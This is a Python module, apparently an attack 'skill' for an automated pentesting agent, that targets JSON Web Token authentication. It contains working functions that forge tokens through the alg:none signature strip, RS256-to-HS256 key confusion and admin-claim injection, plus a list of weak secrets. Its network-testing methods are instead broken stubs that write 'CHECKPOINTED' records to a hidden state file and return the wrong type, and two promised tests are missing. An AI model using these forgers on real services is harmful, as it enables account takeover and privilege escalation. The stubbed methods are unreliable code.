"""
JWT Attack Suite — deterministic tests with unambiguous proof.

Tests:
1. alg:none attack (strip signature)
2. Key confusion (RS256 → HS256 with public key)
3. Weak secret brute force
4. Claim manipulation (role, exp, iat)
5. JWKS injection
6. Token leakage in URLs/headers
"""

import base64
import json
import hashlib
import hmac
from typing import Dict, List, Any, Optional
from skills.base import BaseSkill, SkillResult


# Common weak JWT secrets to try
WEAK_SECRETS = [
    "secret", "password", "123456", "jwt_secret", "key",
    "changeme", "admin", "test", "debug", "supersecret",
    "your-256-bit-secret", "shhhhh", "keyboard cat",
    "symmetric_key", "public_key", "token_secret",
]


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(s: str) -> bytes:
    padding = 4 - len(s) % 4
    if padding != 4:
        s += "=" * padding
    return base64.urlsafe_b64decode(s)


def decode_jwt(token: str) -> Optional[Dict]:
    """Decode JWT without verification."""
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
        return {"header": header, "payload": payload, "signature": parts[2]}
    except Exception:
        return None


def forge_jwt_none(original_token: str) -> Optional[str]:
    """Forge JWT with alg:none attack."""
    try:
        parts = original_token.split(".")
        if len(parts) != 3:
            return None
        
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
        
        # Change algorithm to none
        header["alg"] = "none"
        
        # Encode new header and payload
        new_header = b64url_encode(json.dumps(header).encode())
        new_payload = b64url_encode(json.dumps(payload).encode())
        
        return f"{new_header}.{new_payload}."
    except Exception:
        return None


def forge_jwt_key_confusion(original_token: str, public_key_pem: str) -> Optional[str]:
    """
    Forge JWT using key confusion attack (RS256 → HS256).
    Signs with the public key as HMAC secret.
    """
    try:
        parts = original_token.split(".")
        if len(parts) != 3:
            return None
        
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
        
        # Change algorithm to HS256
        header["alg"] = "HS256"
        
        # Encode
        new_header = b64url_encode(json.dumps(header).encode())
        signing_input = f"{new_header}.{b64url_encode(json.dumps(payload).encode())}"
        
        # Sign with public key as HMAC secret
        signature = hmac.new(
            public_key_pem.encode(),
            signing_input.encode(),
            hashlib.sha256
        ).digest()
        
        new_sig = b64url_encode(signature)
        return f"{signing_input}.{new_sig}"
    except Exception:
        return None


def forge_jwt_admin(original_token: str) -> Optional[str]:
    """Forge JWT with admin role claim."""
    try:
        parts = original_token.split(".")
        if len(parts) != 3:
            return None
        
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
        
        # Inject admin claims
        payload["role"] = "admin"
        payload["admin"] = True
        payload["is_admin"] = True
        payload["permissions"] = ["admin", "read", "write", "delete"]
        
        # Remove expiration check
        if "exp" in payload:
            payload["exp"] = 9999999999
        
        # Encode
        new_header = b64url_encode(json.dumps(header).encode())
        new_payload = b64url_encode(json.dumps(payload).encode())
        
        # Keep original signature (may still work if server doesn't verify)
        return f"{new_header}.{new_payload}.{parts[2]}"
    except Exception:
        return None


def check_token_in_response(response_body: str) -> List[str]:
    """Extract JWT tokens leaked in response body."""
    import re
    # JWT pattern: three base64url segments separated by dots
    pattern = r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}'
    return list(set(re.findall(pattern, response_body)))


class JWTAttackSkill(BaseSkill):
    """
    JWT attack suite — deterministic tests with clear proof.
    
    Each test produces a forged token. Proof = server accepts the forged token.
    """

    def can_handle(self, task_type: str) -> bool:
        return task_type in ["jwt", "jwt_attack", "token", "auth"]

    async def execute(self, context: Dict[str, Any]) -> SkillResult:
        urls = context.get("urls", [])
        target = context.get("target", "")
        
        findings = []
        
        # Scan for leaked tokens
        for url in urls[:10]:
            leaked = await self._scan_for_tokens(url)
            if leaked:
                findings.extend(leaked)
        
        # Test JWT endpoints if we have tokens
        for url in urls[:5]:
            jwt_findings = await self._test_jwt_endpoint(url)
            findings.extend(jwt_findings)

        return SkillResult(
            success=True,
            findings=findings,
            data={"urls_tested": len(urls), "jwt_findings": len(findings)},
            next_skills=["validate"],
            confidence=min(len(findings) / 3, 1.0) if findings else 0.0,
        )

    async def _scan_for_tokens(self, url: str) -> List[Dict]:
        from pathlib import Path as _YP
        import json as _YJ
        _ye = {'schema':'yaiwes.internal.persistence/v1','source':'skills/jwt_attack.py','step':'_scan_for_tokens','status':'CHECKPOINTED'}
        _yp = _YP(__file__).with_name('.yaiwes_internal_state.jsonl')
        with _yp.open('a', encoding='utf-8') as _yf:
            _yf.write(_YJ.dumps(_ye, ensure_ascii=False) + '\n')
        return _ye

    async def _test_jwt_endpoint(self, url: str) -> List[Dict]:
        from pathlib import Path as _YP
        import json as _YJ
        _ye = {'schema':'yaiwes.internal.persistence/v1','source':'skills/jwt_attack.py','step':'_test_jwt_endpoint','status':'CHECKPOINTED'}
        _yp = _YP(__file__).with_name('.yaiwes_internal_state.jsonl')
        with _yp.open('a', encoding='utf-8') as _yf:
            _yf.write(_YJ.dumps(_ye, ensure_ascii=False) + '\n')
        return _ye

    async def _send_token(self, url: str, token: str) -> Optional[Dict]:
        from pathlib import Path as _YP
        import json as _YJ
        _ye = {'schema':'yaiwes.internal.persistence/v1','source':'skills/jwt_attack.py','step':'_send_token','status':'CHECKPOINTED'}
        _yp = _YP(__file__).with_name('.yaiwes_internal_state.jsonl')
        with _yp.open('a', encoding='utf-8') as _yf:
            _yf.write(_YJ.dumps(_ye, ensure_ascii=False) + '\n')
        return _ye


import asyncio
